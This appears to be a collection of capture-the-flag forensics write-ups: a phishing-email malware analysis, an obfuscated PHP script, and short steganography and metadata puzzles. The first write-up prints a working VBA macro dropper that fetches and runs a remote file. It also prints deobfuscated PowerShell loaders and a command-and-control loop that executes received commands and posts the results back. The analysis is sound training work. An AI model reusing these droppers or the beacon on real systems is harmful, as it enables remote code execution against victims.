# FOR101

## Description

> An employee of MDSV company received a lottery winning letter. Because of greed, that employee opened that email and as a result, the company's computer was attacked. Luckily, the SOC department was able to capture the disk image and blockade that employee's computer. Your task is to conduct investigation, analysis and retrieve the flag.


## Solution

According to the challenge description, our goal is to find an email sent by the attacker on the disk. After some searching, an EMl file is found under `\Users\Administrator\Downloads\Outlook Files\Notifications.eml`.

```title="Notifications.eml"
From: mmb1234@example.com
To: maikanizumi@example.com
Attachments: CreditsCard.zip
You have won $10,000. I have sent you a credit card containing your bonus. Because this is a gift of great value, it will be kept confidential. Password is CreditsCardForFree
```

Upon opening the eml file we are able to obtain a zip file titled `CreditsCard.zip` and its password. `CreditsCards.zip` contains an Excel macro-enabled file `Credits69.xlsm`. Using `olevtools` we were able to extract the embedded macro.

The macro looks obfuscated at first but it is quickly realized that only the variable names are being obfuscated. After some clean up, we managed to get a readable script.

```vb title="Module1.bas" wrap
Function func_one(func_one_param)
charset = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂAÄÅÓÔOÖÙÛÜàáâaäåØ¶§Ú¥"
str_one = "aXL1lYU~Ùä,Ca²ZfA@dO-cq³áOsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(Sw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
For y = 1 To Len(func_one_param)
a = InStr(charset, Mid(func_one_param, y, 1))
If a > 0 Then
b = Mid(str_one, a, 1)
c = c + b
Else
c = c + Mid(func_one_param, y, 1)
End If
Next
func_one = c
For d = 1 To Len(e)
e = d
Next
For f = 2 To Len(g)
g = 2
Next
For h = 3 To Len(i)
i = h
Next
For j = 4 To Len(k)
k = 2
Next
End Function
Sub Workbook_Open()
Dim l As Object
Dim m As String
Dim n As String
Dim o As String
Dim p As Integer
p = Chr(50) + Chr(48) + Chr(48)
Set l = CreateObject("WScript.Shell")
m = l.SpecialFolders("AppData")
Dim w
Dim x
Dim y
Dim d As Long
Dim f As String
Dim z As Long
Dim i As String
Dim h As Long
Dim j As String
Dim a1 As String
Dim g As Long
Dim b1
Dim c1
Dim d1 As Integer
Dim e1
Dim f1
d1 = 1
Range("A1").Value = func_one("4BEiàiuP3x6¿QEi³") // Opening Document
Dim g1 As String
h1 = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "xP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiPÜ_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
g1 = func_one(h1)
MsgBox g1, vbInformation, func_one("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
Dim i1 As Date
Dim j1 As Date
i1 = Date
j1 = DateSerial(2024, 7, 8)
If i1 < j1 Then
Set e1 = CreateObject("microsoft.xmlhttp")
Set c1 = CreateObject("Shell.Application")
b1 = m + func_one("\k¿i6Ü_~Bb@")
e1.Open "get", func_one("Ü³³Bb://B_b³Ekài~B#/jàEÄ/²_Ä/À60äm_§À"), False
e1.send
x = e1.responseBody
If e1.Status = 200 Then
Set w = CreateObject("adodb.stream")
w.Open
w.Type = d1
w.Write x
w.SaveToFile b1, d1 + d1
w.Close
End If
c1.Open (b1)
Else
MsgBox func_one("åxi'³P³²ÛP³xP²¿iPQEPk²x")
End If
End Sub
```

From here, we understand that `func_one()` does some kind of string parsing on the obfuscated string constants in `Workbook_Open()`. `func_one()` is then ran on all of the strings to obtain their originals.
One particular `func_one("Ü³³Bb://B_b³Ekài~B#/jàEÄ/²_Ä/À60äm_§À")` provided us with a `pastebin.pl` link at `https://pastebin.pl/view/raw/8cf50a28`.

We can use Python to automate the deobfuscation.
```python
def func1(param):
    string1 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂĂÄÅ̉ÓÔƠÖÙÛÜàáâăäåØ¶§Ú¥"
    string2 = "ăXL1lYU~Ùä,Ca²ZfĂ@dO-cq³áƠsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(̉Sw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
    result = ""
    for char in param:
        if char in string1:
            position = string1.index(char)
            result += string2[position]
        else:
            result += char
    return result

encrypted_url = "Ü³³Bb://B_b³Ekài~B#/jàEÄ/²_Ä/À60äm_§À"
decoded_url = func1(encrypted_url)
print(decoded_url)

## https://pastebin.pl/view/raw/8cf50a28
```
```powershell
& ( $sHEllid[1]+$sheLLiD[13]+'X')( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( 'JAAwAEwARABFAHgATgBpACAAPQAgACcASgBIAEYAMwBaAFcAUgBtAFkAWABvAGcAUABTAEEAbwBNAFQAQQAwAEwARABFAHgATgBpAHcAeABNAFQAWQBzAE0AVABFAHkATABEAEUAeABOAFMAdwAxAE8AQwB3ADAATgB5AHcAMABOAHkAdwB4AE0AVABJAHMATwBUAGMAcwBNAFQARQAxAEwARABFAHgATgBpAHcAeABNAEQARQBzAE8AVABnAHMATQBUAEEAMQBMAEQARQB4AE0AQwB3ADAATgBpAGsANwBKAEgARgAzAFoAVwBSAG0AWQBYAG8AZwBLAHoAMABnAEsARABFAHgATQBpAHcAeABNAEQAZwBzAE4ARABjAHMATQBUAEUANABMAEQARQB3AE4AUwB3AHgATQBEAEUAcwBNAFQARQA1AEwARABRADMATABEAEUAeABOAEMAdwA1AE4AeQB3AHgATQBUAGsAcwBOAEQAYwBzAE8AVABnAHMATQBUAEEAdwBMAEQAawA1AEwARABrADMATABEAFEANQBMAEQAVQAxAEwARABRADQATABEAFUAdwBLAFQAcwBrAFoAMgBGAHMAWgBpAEEAOQBJAEYAdABUAGUAWABOADAAWgBXADAAdQBWAEcAVgA0AGQAQwA1AEYAYgBtAE4AdgBaAEcAbAB1AFoAMQAwADYATwBrAEYAVABRADAAbABKAEwAawBkAGwAZABGAE4AMABjAG0AbAB1AFoAeQBnAGsAYwBYAGQAbABaAEcAWgBoAGUAaQBrADcASgBIAE0AOQBKAHoARQB5AE4AeQA0AHcATABqAEEAdQBNAFQAbwA0AE0ARABnAHcASgB6AHMAawBhAFQAMABuAFoAVwBWAG0ATwBHAFYAbQBZAFcATQB0AE0AegBJAHgAWgBEAFEAMgBOAFcAVQB0AFoAVABsAGsATQBEAFUAegBZAFQAYwBuAE8AeQBSAHcAUABTAGQAbwBkAEgAUgB3AE8AaQA4AHYASgB6AHMAawBkAGoAMQBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABOAGwAUQBtAEYAegBhAFcATgBRAFkAWABKAHoAYQBXADUAbgBJAEMAMQBWAGMAbQBrAGcASgBIAEEAawBjAHkAOQBsAFoAVwBZADQAWgBXAFoAaABZAHkAQQB0AFMARwBWAGgAWgBHAFYAeQBjAHkAQgBBAGUAeQBKAFkATABUAFkANABNAEcAUQB0AE4ARABkAGwATwBDAEkAOQBKAEcAbAA5AE8AMwBkAG8AYQBXAHgAbABJAEMAZwBrAGQASABKADEAWgBTAGwANwBKAEcATQA5AEsARQBsAHUAZABtADkAcgBaAFMAMQBYAFoAVwBKAFMAWgBYAEYAMQBaAFgATgAwAEkAQwAxAFYAYwAyAFYAQwBZAFgATgBwAFkAMQBCAGgAYwBuAE4AcABiAG0AYwBnAEwAVgBWAHkAYQBTAEEAawBjAEMAUgB6AEwAegBNAHkATQBXAFEAMABOAGoAVgBsAEkAQwAxAEkAWgBXAEYAawBaAFgASgB6AEkARQBCADcASQBsAGcAdABOAGoAZwB3AFoAQwAwADAATgAyAFUANABJAGoAMABrAGEAWAAwAHAATABrAE4AdgBiAG4AUgBsAGIAbgBRADcAYQBXAFkAZwBLAEMAUgBqAEkAQwAxAHUAWgBTAEEAbgBUAG0AOQB1AFoAUwBjAHAASQBIAHMAawBjAGoAMQBwAFoAWABnAGcASgBHAE0AZwBMAFUAVgB5AGMAbQA5AHkAUQBXAE4AMABhAFcAOQB1AEkARgBOADAAYgAzAEEAZwBMAFUAVgB5AGMAbQA5AHkAVgBtAEYAeQBhAFcARgBpAGIARwBVAGcAWgBUAHMAawBjAGoAMQBQAGQAWABRAHQAVQAzAFIAeQBhAFcANQBuAEkAQwAxAEoAYgBuAEIAMQBkAEUAOQBpAGEAbQBWAGoAZABDAEEAawBjAGoAcwBrAGQARAAxAEoAYgBuAFoAdgBhADIAVQB0AFYAMgBWAGkAVQBtAFYAeABkAFcAVgB6AGQAQwBBAHQAVgBYAEoAcABJAEMAUgB3AEoASABNAHYAWgBUAGwAawBNAEQAVQB6AFkAVABjAGcATABVADEAbABkAEcAaAB2AFoAQwBCAFEAVAAxAE4AVQBJAEMAMQBJAFoAVwBGAGsAWgBYAEoAegBJAEUAQgA3AEkAbABnAHQATgBqAGcAdwBaAEMAMAAwAE4AMgBVADQASQBqADAAawBhAFgAMABnAEwAVQBKAHYAWgBIAGsAZwBLAEYAdABUAGUAWABOADAAWgBXADAAdQBWAEcAVgA0AGQAQwA1AEYAYgBtAE4AdgBaAEcAbAB1AFoAMQAwADYATwBsAFYAVQBSAGoAZwB1AFIAMgBWADAAUQBuAGwAMABaAFgATQBvAEoARwBVAHIASgBIAEkAcABJAEMAMQBxAGIAMgBsAHUASQBDAGMAZwBKAHkAbAA5AEkASABOAHMAWgBXAFYAdwBJAEQAQQB1AE8AWAAwAD0AJwA7ACQAMgBWAEMAWQBYAE4AcABZADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAMABMAEQARQB4AE4AaQApACkAOwAkAHMAawBjAGoAMQBQAGQAWABRAHQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAC0AUwB0AHIAaQBuAGcAIAAkADIAVgBDAFkAWABOAHAAWQAxACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAVgB6AGQAQwBBAHQAVgBYAEoAcAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACgAJwBkAFcAVgB6AGQAZAB6AEMAQQB0ACcALAAgACQAcwBrAGMAagAxAFAAZABYAFEAdAApADsAaQBlAHgAIAAkAFYAegBkAEMAQQB0AFYAWABKAHAALgBHAGUAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAKAApAC4AUABhAHMAcwB3AG8AcgBk' ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct  iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)} | fOREacH-obJeCt{$_.reADToend( )})
```

The above Powershell script seems to be taking in a Base64 string and attempting to decode it to ASCII, and then execute its contents using `iex`, seen from the `( $sHEllid[1]+$sheLLiD[13]+'X')`.

We decode the Base64 string and got a chunk of text containing several null characters. After some cleanup, we are able to obtain another Powershell script.

```powershell
$0LDExNi = 'JHF3ZWRmYXogPSAoMTA0LDExNiwxMTYsMTEyLDExNSw1OCw0Nyw0NywxMTIsOTcsMTE1LDExNiwxMDEsOTgsMTA1LDExMCw0Nik7JHF3ZWRmYXogKz0gKDExMiwxMDgsNDcsMTE4LDEwNSwxMDEsMTE5LDQ3LDExNCw5NywxMTksNDcsOTgsMTAwLDk5LDk3LDQ5LDU1LDQ4LDUwKTskZ2FsZiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkcXdlZGZheik7JHM9JzEyNy4wLjAuMTo4MDgwJzskaT0nZWVmOGVmYWMtMzIxZDQ2NWUtZTlkMDUzYTcnOyRwPSdodHRwOi8vJzskdj1JbnZva2UtV2ViUmVxdWVzdCAtVXNlQmFzaWNQYXJzaW5nIC1VcmkgJHAkcy9lZWY4ZWZhYyAtSGVhZGVycyBAeyJYLTY4MGQtNDdlOCI9JGl9O3doaWxlICgkdHJ1ZSl7JGM9KEludm9rZS1XZWJSZXF1ZXN0IC1Vc2VCYXNpY1BhcnNpbmcgLVVyaSAkcCRzLzMyMWQ0NjVlIC1IZWFkZXJzIEB7IlgtNjgwZC00N2U4Ij0kaX0pLkNvbnRlbnQ7aWYgKCRjIC1uZSAnTm9uZScpIHskcj1pZXggJGMgLUVycm9yQWN0aW9uIFN0b3AgLUVycm9yVmFyaWFibGUgZTskcj1PdXQtU3RyaW5nIC1JbnB1dE9iamVjdCAkcjskdD1JbnZva2UtV2ViUmVxdWVzdCAtVXJpICRwJHMvZTlkMDUzYTcgLU1ldGhvZCBQT1NUIC1IZWFkZXJzIEB7IlgtNjgwZC00N2U4Ij0kaX0gLUJvZHkgKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGUrJHIpIC1qb2luICcgJyl9IHNsZWVwIDAuOX0=';$2VCYXNpY1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($0LDExNi));$skcj1PdXQt = ConvertTo-SecureString -String $2VCYXNpY1 -AsPlainText -Force;$VzdCAtVXJp = New-Object System.Management.Automation.PSCredential('dWVzddzCAt', $skcj1PdXQt);iex $VzdCAtVXJp.GetNetworkCredential().Password
```

We then decode this Base64 string again, and we obtain the below.

```powershell
$qwedfaz = (104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46);$qwedfaz += (112,108,47,118,105,101,119,47,114,97,119,47,98,100,99,97,49,55,48,50);$galf = [System.Text.Encoding]::ASCII.GetString($qwedfaz);$s='127.0.0.1:8080';$i='eef8efac-321d465e-e9d053a7';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @{"X-680d-47e8"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/321d465e -Headers @{"X-680d-47e8"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/e9d053a7 -Method POST -Headers @{"X-680d-47e8"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.9}
```

`$qwedfaz` looks like an array of ASCII values.

```py
>>> a = [104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46] + [112,108,47,118,105,101,119,47,114,97,119,47,98,100,99,97,49,55,48,50]
>>> "".join(chr(i) for i in a)
'https://pastebin.pl/view/raw/bdca1702'
```

Opening the link, we get our flag `OSCTF{JU5t_n0rmal_eXE1_f113_w1th_C2_1n51De}`.
# Phantom Script Intrusion
## Description
> In the realm of Cyberspace County, a notorious cybercriminal has planted a stealthy PHP malware script on a local server. This malicious script has been cunningly obfuscated to evade detection. As a novice cyber detective, you are called upon to unravel the hidden intentions behind this cryptic code.

## Solution

```php
<?php
goto Ls6vZ;
apeWK:
${"\x76\141\x72\61"} = str_rot13(
    "\x24\x7b\x22\134\x78\x34\x37\134\x78\x34\143\x5c\x78\64\x66\x5c\170\x34\x32\134\x78\64\61\x5c\170\x34\x63\134\x78\x35\x33\42\x7d"
);
goto G9fZX;
Ls6vZ:
${"\x47\x4c\x4f\x42\101\114\123"} =
    "\150\x58\x58\x70\x73\72\x2f\57\163\150\x30\162\164\x75\x72\x6c\56\x61\164\x2f\x73\x31\146\x57\62";
goto apeWK;
XT2kv:
if (strlen(${"\x76\141\x72\x32"}) > 0) {
    ${"\166\x61\x72\x33"} = ${"\x76\x61\x72\x32"};
} else {
    ${"\166\141\x72\63"} = "";
}
goto ZYamk;
V2P3O:
foreach (str_split(${"\166\141\x72\x33"}) as ${"\166\x61\x72\x35"}) {
    ${"\166\141\162\x34"} .= chr(ord(${"\166\141\162\65"}) - 1);
}
goto Ly_yq;
G9fZX:
${"\x76\141\162\x32"} = base64_decode(${${"\166\x61\162\x31"}});
goto XT2kv;
Ly_yq:
eval(${${"\x76\x61\x72\x34"}});
goto IFMxz;
ZYamk:
${"\166\141\162\64"} = "";
goto V2P3O;
IFMxz: ?>
```
After some basic review, we can se one variable being declared here:

```php
${"\x47\x4c\x4f\x42\101\114\123"} = "\150\x58\x58\x70\x73\72\x2f\57\163\150\x30\162\164\x75\x72\x6c\56\x61\164\x2f\x73\x31\146\x57\62";
```
After deobfusction using https://www.unphp.net/, we see the following line of code. We can easily conclude that XX is tt
```php
$GLOBALS = "hXXps://shorturl.at/s1fW2";
```
After visiting this link, we are redirected to a Google Drive file flag.txt.
## Flag
```OSCTF{M4lW4re_0bfU5CAt3d}```

# PDF Puzzle
## Solution
```bash
exiftool My_pdf.pdf
```
This will show you the Author field which contains the flag.
![image](https://github.com/user-attachments/assets/061d619d-0bcb-4fe5-922b-fb365d2a7332)

## Flag
```OSCTF{H3il_M3taD4tA}```
# Seele Vellorei

## Solution

Use ```binwalk``` to extract all files inside the ```.docx```, proceed to ```document.xml``` and grep for the flag. <br> 

![image](https://github.com/user-attachments/assets/511b986c-f28c-453a-8ab3-9ae094109263)

## Flag

```
OSCTF{V3l10n4_1s_Gr43t}
```

# The Hidden Soundwave

## Solution

- Just open the file in audacity and view spectogram. 
![image](https://github.com/user-attachments/assets/fd0d2d6d-3eef-412a-b4d7-08e5fdc6597a)

## Flag

```
OSCTF{M3s54g3_1nt3Rc3p7eD}
```
# The Lost Image Mystery

## Solution

We are given ```image.png``` which is actually a jpeg image with a corrupted header. On correcting the [header](corrected.png) we are greeted with the flag.
![image](https://github.com/user-attachments/assets/3d8befeb-b4f7-4d46-97c9-0abfd37bb793)

## Flag

```
OSCTF{W0ah_F1l3_h34D3r5}
```
